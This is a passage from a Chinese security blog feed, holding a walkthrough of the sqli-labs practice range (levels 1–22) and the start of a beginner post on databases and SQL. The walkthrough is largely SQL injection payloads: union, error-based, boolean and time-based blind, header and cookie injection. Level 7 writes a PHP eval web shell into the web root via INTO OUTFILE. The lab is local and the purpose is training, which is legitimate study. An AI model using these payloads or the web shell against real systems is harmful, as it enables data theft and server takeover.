        <content type="html"><![CDATA[<h3 id="1-Less-1"><a href="#1-Less-1" class="headerlink" title="1. Less-1"></a>1. Less-1</h3><p>我们先进入靶场，根据提示构造一下id，然后正式开始渗透</p><p>我们先用数字型找一下注入点</p><pre><code>1 and 1=2</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程1.webp" alt=""></p><p>这里数据返回正常，但是我们的这个代码应该是返回错误的数据，说明构造的不对，再用字符串型找一下</p><pre><code>1&#39; and 1=1 --</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程2.webp" alt=""></p><p>看到这儿之后就简单了，就是个简单的字符型注入，之后就是常规操作了。</p><p>先拿脚本order by一下，脚本就是个简单的爬虫，利用了order by的特性。当然你要想一个一个试也行</p><pre><code>1&#39; order by 3 --</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程6.webp" alt=""></p><p>跑出来字段数是3</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程3.webp" alt=""></p><p>然后再联合注入一下，我们构造一下url</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程7.webp" alt=""></p><p>得到URL</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程4.webp" alt=""></p><p>我们直接访问这个URL，然后看一下这个url的效果</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程5.webp" alt=""></p><p>可以看到，第二个和第三个字段是显示的。</p><p>然后就是正常的替换了，把我们要显示的内容替换到2或者3的位置上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3 -- </span><br></pre></td></tr></table></figure><p>上面的代码就是说让数据库名称显示在2的位置上。</p><p>注意这里是-1，如果是1的话，会显示原来网页上的内容。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程8.webp" alt=""></p><p>这样为我们就得到了表和字段，接下来查看字段数据就行了，这个就简单了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1, group_concat(username), 3 from users --</span><br></pre></td></tr></table></figure><p>上面代码的意思是让username中的数据全部显示在2的位置上。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程9.webp" alt=""></p><p>这样就得到了users表的username字段了，同理就可以得到password字段内容。</p><h3 id="2-Less-2"><a href="#2-Less-2" class="headerlink" title="2. Less-2"></a>2. Less-2</h3><p>先找注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程10.webp" alt=""></p><p>发现1=2无数据，1=1有数据，可以确定是个简单的数字型注入。</p><p>先order by一下</p><pre><code>1 order by 3</code></pre><p>获取当前字段数为3，然后开始联合注入</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程11.webp" alt=""></p><p>得到URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, 2, 3</span><br></pre></td></tr></table></figure><p>访问这个URL，看显错位（就是显示啥数字）</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程12.webp" alt=""></p><p>我们找到了显错位，之后就是和Less-1一样了。直接联合注入就行。</p><h3 id="3-Less-3"><a href="#3-Less-3" class="headerlink" title="3. Less-3"></a>3. Less-3</h3><p>这个的注入点不是怎么太常规，正常的字符型和数字型都不太可以，那就随便试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and 1=2</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程13.webp" alt=""></p><p>不应该显示数据但却显示了，说明找错了，试试字符串型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and 1=1 --</span><br></pre></td></tr></table></figure><p>发现1=1时数据返回正常，1=2时无数据，找到注入点，然后就是和之前两个一样了，order by，找显错，改字段，和上面基本一样没啥好说的。</p><pre><code>1&#39;) order by 3 ---1&#39;) union select 1,2,3 --</code></pre><h3 id="4-Less-4"><a href="#4-Less-4" class="headerlink" title="4. Less-4"></a>4. Less-4</h3><p>试一下注入点</p><p>找到是双引号加括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) and 1=1 --</span><br></pre></td></tr></table></figure><p>你可能会问我怎么试的，就是随便试的，做多了就有经验……</p><p>然后还是一样了，联合注入</p><pre><code>1&quot;) order by 3 ---1&quot;) union select 1,2,3 --</code></pre><h3 id="5-Less-5"><a href="#5-Less-5" class="headerlink" title="5. Less-5"></a>5. Less-5</h3><p>试了一下，是一个简单的字符串注入</p><pre><code>1&#39; and 1=2 --</code></pre><p>但是它好像不能用联合注入。那我们就得用其他的方法了。</p><p>发现这道题存在报错，所以可以用报错注入</p><p>先试字段数</p><pre><code>1&#39; order by 3 --</code></pre><p>确定字段数为3</p><p>然后开始盲注了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select database())),1) --</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程14.webp" alt=""></p><p>这样就得到了数据库的名称。</p><p>然后我们把database()换成其他的函数，就可以得到其他的数据</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程16.webp" alt=""></p><p>这里数据路径和数据库的安装路径是报错不出来的</p><p>然后就是“愉快”的爆表环节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;)),1) --</span><br></pre></td></tr></table></figure><p>这样就得到了security库下的所有表</p><p>然后从该表下得到所有的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)),1) --</span><br></pre></td></tr></table></figure><p>获取security库下的users表中的所有字段。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程17.webp" alt=""></p><p>得到字段，下面就简单了。</p><pre><code>1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(username) from users)),1) --</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程18.webp" alt=""></p><p>但是这里数据显示不全，用limlt函数一个一个显示就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select username from users limit 0,1)),1) --</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程19.webp" alt=""></p><h3 id="6-Less-6"><a href="#6-Less-6" class="headerlink" title="6. Less-6"></a>6. Less-6</h3><p>这关不怎么好看，我这里给一个建议</p><p>我们直接id=9999999，一个特别大的数，肯定是不会返回数据的，这时候再用or去试</p><p>然后这里试出来试这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000&quot; or 1=1 --</span><br></pre></td></tr></table></figure><p>然后这道题还有报错。</p><p>又是字符串型的报错注入，和上面一样，把单引号变成双引号就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and updatexml(1,concat(&#x27;~&#x27;,(select database())),1) --</span><br><span class="line"> |</span><br><span class="line">改成双引号就行</span><br></pre></td></tr></table></figure><h3 id="7-Less-7"><a href="#7-Less-7" class="headerlink" title="7. Less-7"></a>7. Less-7</h3><p>这个试注入点会有点难受</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;)) and 1=1 --</span><br></pre></td></tr></table></figure><p>它这个试是单引号加两个括号，不怎么容易试。</p><p>然后我们发现order by 能用，但是下一步就有点不太好使了，这还有点像盲注，但是报错注入要是去试的话还不好使，时间盲注也不太像。</p><p>我们这里用到了into outfile来实现一个叫“写马”的操作。</p><p>先准备一个木马，我这里用了一个经典的PHP木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[123]);?&gt;  // 这个123就是一会儿的密码</span><br></pre></td></tr></table></figure><p>SQL注入上传文件的话，需要权限，我们去MySQL设置一下。</p><p>在mysql配置文件中添加：secure_file_priv=</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程20.webp" alt=""></p><p>然后就可以上传文件了</p><p>注意这个上传路径，我们后面是要访问的，所以要放到网站文件夹底下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql-libs/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27; into outfile &#x27;D:\\SoftWare\\phpstudy_pro\\WWW\\sql-libs\\Less-7\\Less7.php&#x27; --</span><br></pre></td></tr></table></figure><p>但是我这里出了问题，死活传不上……，改URL目录，加减反斜杠，设置文件权限，但是还是不行。</p><h3 id="8-Less-8"><a href="#8-Less-8" class="headerlink" title="8. Less-8"></a>8. Less-8</h3><p>很容易找到注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and 1=1 --</span><br></pre></td></tr></table></figure><p>但是发现了一个问题：语句错误无显示；语句正确一直显示相同内容，</p><p>这就是用到布尔盲注了</p><pre><code>1&#39; order by 3 --</code></pre><p>先找字段数，跑出来是3</p><p>然后开始猜内容了。</p><p>先猜数据库长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=8 --</span><br></pre></td></tr></table></figure><p>然后猜数据库的名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),8,1))=121 --</span><br><span class="line">第八个字符的ascii码为121，即y</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程24.webp" alt=""></p><p>这样得到了数据库的名字，但是这个过程，额，会浪费亿点点时间。</p><p>获取有几张表</p><pre><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程25.webp" alt=""></p><p>获取每张表的长度</p><pre><code>1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1)) = 6 --</code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程26.webp" alt=""></p><p>获取每张表的名字</p><pre><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101 -- </code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程27.webp" alt=""></p><p>我们得到了一张users表，我们现在猜users表中有几个字段</p><pre><code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)=3 -- </code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程28.webp" alt=""></p><p>然后获取每个字段的长度、</p><pre><code>1&#39; and length((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1))=2 -- </code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程29.webp" alt=""></p><p>获取每个字段的名称</p><pre><code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=105 -- </code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程30.webp" alt=""></p><p>我们这样就可以得到字段名，然后就能得到字段数据了</p><pre><code>1&#39; and ascii(substr((select concat(username,&#39;@&#39;,password) from users limit 0,1),1,1))=68 -- </code></pre><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程31.webp" alt=""></p><h3 id="9-Less-9"><a href="#9-Less-9" class="headerlink" title="9. Less-9"></a>9. Less-9</h3><p>这个在找注入点的时候，发现怎么弄返回结果都不变，感觉是需要时间盲注。</p><p>发现正常的访问时间差为近2s，但是此时是3s多，这是一个字符串型注入。</p><p>时间盲注和布尔注入差不多，就是加了个时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (ascii(substr(database(),1,1))=121 and sleep(1) -- </span><br><span class="line"></span><br><span class="line">就是在后面加了个sleep(1)，需要判断时间差是否大于正常值</span><br></pre></td></tr></table></figure><h3 id="10-Less-10"><a href="#10-Less-10" class="headerlink" title="10. Less-10"></a>10. Less-10</h3><p>无论怎么弄结果都不变，怀疑还是用时间盲注</p><p>找到注入点是双引号注入。</p><p>和上道题几乎一摸一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and (ascii(substr(database(),1,1))=121 and sleep(1) -- </span><br><span class="line"> |</span><br><span class="line">双引号</span><br></pre></td></tr></table></figure><h3 id="11-Less-11"><a href="#11-Less-11" class="headerlink" title="11. Less-11"></a>11. Less-11</h3><p>这道题长得不太一样，是一个登录界面</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程33.webp" alt=""></p><p>我们简单试一下。</p><p>账号密码输入123456</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程34.webp" alt=""></p><p>嗯，不行，上burp</p><p>我们先截一下包</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程35.webp" alt=""></p><p>我们注入一下</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程36.webp" alt=""></p><p>然后放行</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程37.webp" alt=""></p><p>发现漏洞。</p><p>我们正常注入一下</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程38.webp" alt=""></p><p>注意这里是用 # 表示注释</p><p>放行</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程39.webp" alt=""></p><p>可以的登录，确认是字符串型注入。</p><p>然后就可以通过这种方式得到不同的数据</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程40.webp" alt=""></p><p>order by 3返回数据失败，order by 2成功返回数据，字段数为2</p><p>然后开始搞数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ad&#x27; union select user(),database()#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程41.webp" alt=""></p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程42.webp" alt=""></p><p>这俩都是显错位，得到数据库和用户信息，剩下的直接搞就行了。</p><p>查看security库下的所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程43.webp" alt=""></p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程44.webp" alt=""></p><p>查看users表下的所有字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ad&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程45.webp" alt=""></p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程46.webp" alt=""></p><p>查看username和password字段的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ad&#x27; union select 1,(select group_concat(username,password) from security.users)#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程47.webp" alt=""></p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程48.webp" alt=""></p><h3 id="12-Less-12"><a href="#12-Less-12" class="headerlink" title="12. Less-12"></a>12. Less-12</h3><p>和上一道题一样的过程，就是注入点变了一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&quot;) or 1=1 #</span><br></pre></td></tr></table></figure><p>其他和上一道题一样</p><h3 id="13-Less-13"><a href="#13-Less-13" class="headerlink" title="13. Less-13"></a>13. Less-13</h3><p>好像也一样，找注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) or 1=1 #</span><br></pre></td></tr></table></figure><p>但是上面的套路好像不太好使，试了几次，感觉是报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27;) and updatexml(1,(concat(&#x27;~&#x27;,(select database()))),1)#</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程49.webp" alt=""></p><p>这样就得到了数据库名称</p><p>剩下的和常规报错注入一样了，我这里就展示一个爆破表的代码，剩下的自己试试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27;) and updatexml(1,(concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;))),1)#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程50.webp" alt=""></p><h3 id="14-Less-14"><a href="#14-Less-14" class="headerlink" title="14. Less-14"></a>14. Less-14</h3><p>和13题一样，就是把单引号换为双引号，无需闭合括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; or 1=1 #</span><br></pre></td></tr></table></figure><p>其他的和13题一样。</p><h3 id="15-Less-15"><a href="#15-Less-15" class="headerlink" title="15. Less-15"></a>15. Less-15</h3><p>找注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p>在order by 的时候发现这玩意不变了，又是盲注。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; or length(database())=8 and sleep(0.1) #p</span><br></pre></td></tr></table></figure><h3 id="16-Less-16"><a href="#16-Less-16" class="headerlink" title="16. Less-16"></a>16. Less-16</h3><p>注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) or 1=1 #</span><br></pre></td></tr></table></figure><p>试了一下，还是时间盲注，和上一道题一样。</p><h3 id="17-Less-17"><a href="#17-Less-17" class="headerlink" title="17. Less-17"></a>17. Less-17</h3><p>这道题有一个已知条件账号是admin，要不然做不出来。</p><p>映入眼帘的是一个[PASSWORD RESET]</p><p>这里要注意一下，这个是密码重置，要注入的是密码。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程52.webp" alt=""></p><p>密码重置，创建，修改，这些都是针对数据库的增删操作，我们用的是update函数，所以我们也要用这个。</p><p>那这就简单了，报错注入嘛，先找注入点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程53.webp" alt=""></p><p>然后在密码处注入就行了.</p><pre><code>passwd=1&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1) #</code></pre><h3 id="18-Less-18"><a href="#18-Less-18" class="headerlink" title="18. Less-18"></a>18. Less-18</h3><p>这道题的前提是知道账号和密码，要不然做不出来</p><p>账号：Dumb，密码：Dumb</p><p>我们登录一下，发现有个这个东西</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程54.webp" alt=""></p><p>返回了一个UA信息，那么我们应该就是要修改UA来进行注入了。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程55.webp" alt=""></p><p>这里有报错信息，说明可以用报错注入。</p><p>找到注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>就是一个简简单单的单字符注入。</p><p>这里注意一下，要确定一下字段</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程57.webp" alt=""></p><p>现在是两个字段，说少字段，那就再加</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程58.webp" alt=""></p><p>三个字段刚好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UA设置为：</span><br><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,database()), 0), 1, 1) #</span><br></pre></td></tr></table></figure><p>其他的和报错注入一样。</p><h3 id="19-Less-19"><a href="#19-Less-19" class="headerlink" title="19. Less-19"></a>19. Less-19</h3><p>和18题一样，登录之后显示refer</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程56.webp" alt=""></p><p>把代码放到refer里头就行了</p><p>这里注意，字段数是2</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程59.webp" alt=""></p><p>其他的没啥，套脚本就行。</p><h3 id="20-Less-20"><a href="#20-Less-20" class="headerlink" title="20. Less-20"></a>20. Less-20</h3><p>这道题登录进去一堆乱七八糟的</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程60.webp" alt=""></p><p>这里是我们登录进去，出现的这些内容。</p><p>所以说出现这个界面的前提是cookie内容正确，那我们在这个页面改一下cookie会怎么样。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程61.webp" alt=""></p><p>order by 3 没问题，order by 4出现报错，字段数为3</p><p>然后就简单了，报错注入就行了。</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程62.webp" alt=""></p><p>剩下的和之前一样。</p><h3 id="21-Less-21"><a href="#21-Less-21" class="headerlink" title="21. Less-21"></a>21. Less-21</h3><p>登录进去感觉好像和上一道题一样。</p><p>我们抓一下包</p><p>哎，这个cookie</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程63.webp" alt=""></p><p>加密了一次，这应该是base64加密，我们解一下试试</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程64.webp" alt=""></p><p>我们现在的思路就是，把SQL语句加密一次，然后再传参。</p><p>注入方式是单引号括号注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) #</span><br></pre></td></tr></table></figure><p>我们找字段数</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程65.webp" alt=""></p><p>这样得到加密数据</p><p><img src="\media\2023\01\SQL-Libs靶场Page-11-22教程66.webp" alt=""></p><p>得到显错位，然后就简单了，联合注入就行了。</p><h3 id="22-Less-22"><a href="#22-Less-22" class="headerlink" title="22. Less-22"></a>22. Less-22</h3><p>和上一道一样，单引号变双引号就行了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入介绍与靶场实战</title>
      <link href="/2023/02/16/15/"/>
      <url>/2023/02/16/15/</url>
      
        <content type="html"><![CDATA[<p><strong>在实战部分需要有一定的python爬虫基础</strong></p><p><strong>如果有看不懂的请在下方留言</strong></p><h2 id="一-数据库相关知识简介"><a href="#一-数据库相关知识简介" class="headerlink" title="一. 数据库相关知识简介"></a>一. 数据库相关知识简介</h2><h3 id="1-什么是数据库"><a href="#1-什么是数据库" class="headerlink" title="1. 什么是数据库"></a>1. 什么是数据库</h3><p>数据库就是将大量数据把保存起来，通过计算机加工而成的可以高效访问的数据集</p><h3 id="2-常见的数据库"><a href="#2-常见的数据库" class="headerlink" title="2. 常见的数据库"></a>2. 常见的数据库</h3><p>Oracle：甲骨文公司</p><p>SQL Servers：微软公司</p><p>DB2：IBM 公司</p><p>PostgreSQL：开源</p><p>MySQL：开源</p><p>Access：微软公司（老古董）</p><p>我们把调用这些数据库的语句，统一叫做SQL语句</p><p>尽管数据库的种类繁多，但这些数据库的SQL语句是相通的。同一条SQL语句可以在不同的数据库上执行，得到相同的效果</p><p>不过不同的数据库他是会有一些自己独有的特性，不过很少。</p><h3 id="3-数据库结构"><a href="#3-数据库结构" class="headerlink" title="3. 数据库结构"></a>3. 数据库结构</h3><p>我们用 SQL - Font 工具对数据库进行可视化分析</p><p>这就是这样</p><p><img src="\media\2022\12\Pasted-image-20221224162751-1.webp" alt=""></p><h4 id="1-左面那些东西"><a href="#1-左面那些东西" class="headerlink" title="(1) 左面那些东西"></a>(1) 左面那些东西</h4><p>我们先看看左面那些图标都是些什么牛马</p><p>我们先来看这个</p><p><img src="\media\2022\12\Pasted-image-20221224162829.webp" alt=""></p><p>这个代表当前的服务器，所有的数据库都在服务器下</p><p><img src="\media\2022\12\Pasted-image-20221224162921.webp" alt=""></p><p>这几个是在服务器下的所有数据库</p><p>一个服务器下可以有多个网站，一个网站有一个数据库</p><p>这里注意有两个特殊的库，就是那个图标和其他数据库不一样的那两个</p><p><img src="\media\2022\12\Pasted-image-20221224163917.webp" alt=""></p><p>这两个数据库是MySQL自带的数据库，之后会讲到。</p><p>我们随便打开一个数据库看看</p><p><img src="\media\2022\12\Pasted-image-20221224164057.webp" alt=""></p><p>发现它底下有两个网格图标的东西，我们点击去查看一下它的内容</p><p><img src="\media\2022\12\Pasted-image-20221224164344.webp" alt=""></p><p>这里有一个id和一个name，我们目前还不知道这是啥</p><p>到此为止，左面的东西我们了解的差不多了，左面其他没讲的东西不用管它</p><h4 id="2-右面的那些东西"><a href="#2-右面的那些东西" class="headerlink" title="(2) 右面的那些东西"></a>(2) 右面的那些东西</h4><p>首先是这个</p><p><img src="\media\2022\12\Pasted-image-20221224164953.webp" alt=""></p><p>我们打开了admin，查看它的数据浏览器</p><p>可以看见，它的数据结构是个excel表</p><p>我们点开下面的那个website的数据浏览器，看看是什么样的</p><p><img src="\media\2022\12\Pasted-image-20221224165207.webp" alt=""></p><p>发现它的数据结构也是一张表</p><p>所以我们可以知道，<strong>数据库存放的是一张张的表</strong></p><p>比如我们现在这个 <strong>test数据库存放了两张表，分别是admin表和website表</strong></p><p><strong>通过数据浏览器可以看到表的结构和内容</strong></p><p>我们在来看看数据浏览器旁边的那个对象浏览器</p><p>我们打开admin表的对象浏览器</p><p><img src="\media\2022\12\Pasted-image-20221224165544.webp" alt=""></p><p>发现这里有个名词，叫做 “字段”</p><p>这个内容有点熟悉啊，这不就是admin表的列嘛</p><p><strong>在数据库中，表里的列不叫列，叫做字段</strong></p><p>我们还可以看到其他的东西，比如这个字段的类型等信息</p><p><strong>对象浏览器可以查看表中字段的信息</strong></p><p>在最右面的那个SQL编辑器就是我们编写SQL语句的地方</p><h3 id="4-简单的SQL语句"><a href="#4-简单的SQL语句" class="headerlink" title="4. 简单的SQL语句"></a>4. 简单的SQL语句</h3><p>编写SQL语句的时候就到SQL编辑器里编辑就行</p><h4 id="1-SELECT-字段名-FROM-表名"><a href="#1-SELECT-字段名-FROM-表名" class="headerlink" title="(1) SELECT 字段名 FROM 表名"></a>(1) SELECT 字段名 FROM 表名</h4><p>我们现在想要通过SQL语句查询website表中的url字段信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select url from website</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224170231.webp" alt=""></p><p>我们想要查询website表里的url和name两个字段的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select url,name from website  // 更多字段同理</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224170407.webp" alt=""></p><p>我们想要查看这个website表的所以字段信息呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website  // 这里 * 代表所有的字段</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224170546.webp" alt=""></p><h4 id="2-WHERE"><a href="#2-WHERE" class="headerlink" title="(2) 